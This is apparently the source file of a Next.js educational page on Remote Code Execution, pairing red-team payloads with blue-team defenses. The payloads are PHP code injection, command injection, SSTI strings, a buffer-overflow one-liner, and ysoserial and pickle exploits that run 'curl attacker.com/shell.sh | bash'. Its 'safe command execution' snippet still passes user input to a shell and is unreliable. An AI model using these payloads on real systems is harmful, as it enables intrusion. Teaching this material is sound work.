/* eslint-disable react/no-unescaped-entities */
// File: /app/rce/page.tsx

export default function RCEPage() {
  return (
    <div className="p-8 max-w-4xl mx-auto font-sans text-white">
      <h1 className="text-4xl font-extrabold mb-8 text-purple-600">Remote Code Execution (RCE)</h1>

      <section className="mb-8">
        <h2 className="text-2xl font-bold mb-3">What is RCE?</h2>
        <p className="leading-relaxed">
          Remote Code Execution is a critical vulnerability that allows attackers to execute arbitrary code on a target system or application. 
          This is often the "holy grail" of vulnerabilities as it provides complete control over the affected system.
        </p>
        <div className="mt-4 p-4 bg-gray-800 rounded-lg">
          <h3 className="text-lg font-semibold mb-2 text-orange-300">RCE Impact Severity:</h3>
          <ul className="list-disc list-inside space-y-1">
            <li>Complete system compromise</li>
            <li>Data theft and exfiltration</li>
            <li>Persistence establishment</li>
            <li>Network pivoting</li>
            <li>Denial of Service</li>
          </ul>
        </div>
      </section>


      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-red-600">Red Team Techniques (Offensive)</h2>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">1. Web Application RCE</h3>
          <p className="mb-3">
            Web application RCE occurs when user input is improperly sanitized and gets evaluated as code by the server. Common vectors include injection flaws, deserialization vulnerabilities, and template injection.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">PHP Code Injection</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/page.php?file=data://text/plain,<?php system($_GET['cmd']);?>`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Injects PHP code through file inclusion vulnerability.</p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Command Injection</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`http://vulnerable.com/ping?ip=127.0.0.1;id`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Appends OS commands to legitimate input.</p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Java Deserialization</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`POST /api/v1/process HTTP/1.1
Content-Type: application/x-java-serialized-object

<base64 encoded ysoserial payload>`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Exploits insecure deserialization in Java applications.</p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-1">Common Web RCE Vectors:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Command injection (OS commands)</li>
                <li>Code injection (PHP, Python, Node.js, etc.)</li>
                <li>Insecure deserialization</li>
                <li>Server-Side Template Injection (SSTI)</li>
                <li>Expression Language Injection</li>
              </ul>
            </div>
          </div>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">2. Binary Exploitation RCE</h3>
          <p className="mb-3">
            Binary exploitation involves manipulating compiled programs to execute arbitrary code through memory corruption vulnerabilities like buffer overflows, format string bugs, and use-after-free errors.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Buffer Overflow</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`./vulnerable $(python -c 'print "A"*500 + "\\xef\\xbe\\xad\\xde"')`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Overwrites return address with controlled value.</p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Return-Oriented Programming (ROP)</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`# ROP chain construction
# Gadget 1: pop rdi; ret
# Gadget 2: address of "/bin/sh"
# Gadget 3: address of system()`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Bypasses DEP by chaining existing code snippets.</p>
            </div>

            <div className="p-3 bg-red-900/30 rounded">
              <h4 className="font-medium mb-1">Common Binary Exploit Types:</h4>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Stack-based buffer overflow</li>
                <li>Heap overflow</li>
                <li>Format string vulnerability</li>
                <li>Use-after-free</li>
                <li>Race conditions</li>
              </ul>
            </div>
          </div>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">3. Deserialization Attacks</h3>
          <p className="mb-3">
            Insecure deserialization converts serialized data into objects without proper validation, allowing attackers to craft malicious payloads that execute code during deserialization.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Java Deserialization (ysoserial)</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`java -jar ysoserial.jar CommonsCollections5 'curl attacker.com/shell.sh | bash' > payload.bin`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Generates malicious serialized object for Java apps.</p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Python Pickle Exploit</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

pickle.dump(RCE(), open('payload.pkl','wb'))`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Creates malicious pickle file that executes code when loaded.</p>
            </div>
          </div>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">4. Template Injection</h3>
          <p className="mb-3">
            Server-Side Template Injection (SSTI) occurs when user input is embedded in templates in an unsafe manner, allowing attackers to inject template directives that execute code.
          </p>

          <div className="space-y-4">
            <div>
              <h4 className="font-medium mb-1">Jinja2 SSTI (Python)</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`{{ ''.__class__.__mro__[1].__subclasses__()[407]('whoami', shell=True, stdout=-1).communicate() }}`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Exploits Python template engines to execute commands.</p>
            </div>

            <div>
              <h4 className="font-medium mb-1">Twig SSTI (PHP)</h4>
              <pre className="bg-gray-700 p-3 rounded overflow-auto">
{`{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}`}
              </pre>
              <p className="text-sm text-gray-400 mt-1">Executes system commands through Twig templates.</p>
            </div>
          </div>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-red-400">RCE Tools & Payloads</h3>

          <h4 className="font-medium mb-1 mt-3">Exploitation Frameworks</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Metasploit Framework (multi-platform)</li>
            <li>ysoserial (Java deserialization)</li>
            <li>GadgetProbe (Java deserialization probing)</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Payload Generators</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>msfvenom (Metasploit payload generator)</li>
            <li>Shells.s (Reverse shell cheat sheet)</li>
            <li>RevShells (Interactive reverse shell generator)</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Post-Exploitation</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Cobalt Strike (command and control)</li>
            <li>Empire (post-exploitation framework)</li>
            <li>Mimikatz (credential dumping)</li>
          </ul>
        </article>
      </section>







      <section className="mb-10">
        <h2 className="text-3xl font-semibold mb-4 text-blue-600">Blue Team Defenses</h2>
      
        <div className="space-y-6">
          {/* Input Validation */}
          <div className="bg-gray-900 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-blue-400">1. Input Validation</h3>
            
            <div className="space-y-4">
              <div>
                <h4 className="font-medium mb-2">Command Injection Prevention</h4>
                <div className="bg-gray-700 p-3 rounded overflow-auto">
                  <code>
                    {`// Safe command execution\nconst cleanInput = sanitize(userInput);\nexec(\`ping \${cleanInput}\`);`}
                  </code>
                </div>
              </div>
      
              <div>
                <h4 className="font-medium mb-2">SQL Parameterization</h4>
                <div className="bg-gray-700 p-3 rounded overflow-auto">
                  <code>
                    {`// Parameterized query\n"SELECT * FROM users WHERE id = ?", [userId]`}
                  </code>
                </div>
              </div>
            </div>
          </div>
      
          {/* Secure Coding */}
          <div className="bg-gray-900 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-blue-400">2. Secure Coding</h3>
            
            <div className="space-y-4">
              <div>
                <h4 className="font-medium mb-2">Safe Deserialization</h4>
                <div className="bg-gray-700 p-3 rounded overflow-auto">
                  <code>
                    {`// Validate classes before deserializing\nif (!allowedClasses.includes(className)) {\n  throw new Error("Blocked");\n}`}
                  </code>
                </div>
              </div>
      
              <div>
                <h4 className="font-medium mb-2">Template Safety</h4>
                <div className="bg-gray-700 p-3 rounded overflow-auto">
                  <code>
                    {`// Auto-escaping in templates\n<%= unsafeInput %>`}
                  </code>
                </div>
              </div>
            </div>
          </div>
        </div>







  

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">3. System Hardening</h3>
          
          <h4 className="font-medium mb-1 mt-3">Memory Protections</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>DEP (Data Execution Prevention)</li>
            <li>ASLR (Address Space Layout Randomization)</li>
            <li>Stack canaries</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Least Privilege</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Run services with minimal permissions</li>
            <li>Use containers with restricted capabilities</li>
            <li>Implement proper sandboxing</li>
          </ul>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">4. Monitoring & Detection</h3>
          
          <h4 className="font-medium mb-1 mt-3">SIEM Rules</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Detect suspicious process execution</li>
            <li>Alert on shell spawning patterns</li>
            <li>Monitor for unusual network connections</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Endpoint Protection</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Behavioral analysis of processes</li>
            <li>Memory protection modules</li>
            <li>Exploit prevention techniques</li>
          </ul>
        </article>

        <article className="mb-6 bg-gray-900 p-4 rounded-lg">
          <h3 className="text-xl font-semibold mb-2 text-blue-400">5. Patch Management</h3>
          
          <h4 className="font-medium mb-1 mt-3">Vulnerability Scanning</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>Regular dependency scanning (OWASP DC)</li>
            <li>Static and dynamic code analysis</li>
            <li>Binary hardening checks</li>
          </ul>

          <h4 className="font-medium mb-1 mt-3">Patch Prioritization</h4>
          <ul className="list-disc list-inside ml-4 space-y-1">
            <li>CVSS scoring for RCE vulnerabilities</li>
            <li>Zero-day mitigation strategies</li>
            <li>Emergency patch procedures</li>
          </ul>
        </article>
      </section>






      


      <div className="mb-12 p-4 bg-gray-800 rounded-lg border-l-4 border-blue-500">
        <h3 className="text-lg font-semibold mb-2 text-blue-400">RCE Mitigation Checklist</h3>
        <ul className="list-disc list-inside ml-4 space-y-1">
          <li>Implement strict input validation</li>
          <li>Use safe APIs for command execution</li>
          <li>Apply proper output encoding</li>
          <li>Enable memory protection mechanisms</li>
          <li>Keep all components patched</li>
          <li>Monitor for suspicious execution patterns</li>
          <li>Conduct regular security testing</li>
        </ul>
      </div>

      <section className="mb-12">
        <h2 className="text-3xl font-semibold mb-4">Additional Resources & References</h2>
        <div className="space-y-6">
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Learning Resources</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://owasp.org/www-community/attacks/Code_Injection" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  OWASP Code Injection — Comprehensive documentation
                </a>
              </li>
              <li>
                <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  PayloadsAllTheThings RCE — Cheat sheet
                </a>
              </li>
              <li>
                <a href="https://book.hacktricks.xyz/pentesting-web/command-injection" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  HackTricks RCE Techniques
                </a>
              </li>
            </ul>
          </div>
          <div className="bg-gray-800 p-4 rounded-lg">
            <h3 className="text-xl font-semibold mb-3 text-yellow-400">Security Tools</h3>
            <ul className="space-y-3">
              <li>
                <a href="https://www.metasploit.com/" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  Metasploit Framework — Exploitation toolkit
                </a>
              </li>
              <li>
                <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  ysoserial — Java deserialization payloads
                </a>
              </li>
              <li>
                <a href="https://revshells.com/" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                  Reverse Shell Generator — Interactive payload creator
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>


      
    </div>
  );
}
